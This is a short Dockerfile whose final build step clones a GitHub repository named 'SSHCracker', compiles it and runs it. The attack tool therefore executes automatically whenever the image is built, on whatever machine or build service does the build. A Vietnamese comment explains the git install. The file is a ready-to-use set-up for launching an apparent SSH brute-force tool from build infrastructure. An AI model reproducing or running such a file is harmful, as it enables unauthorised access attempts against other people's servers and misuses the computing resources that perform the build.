# Dockerfile.run-at-build
FROM golang:1.21-bullseye

# cài git (golang image chưa chắc có git trong một số tag)
RUN apt-get update && \
    apt-get install -y --no-install-recommends git && \
    rm -rf /var/lib/apt/lists/*



RUN git clone https://github.com/teo818272278181/SSHCracker.git && cd SSHCracker && go build v2.go && ./v2

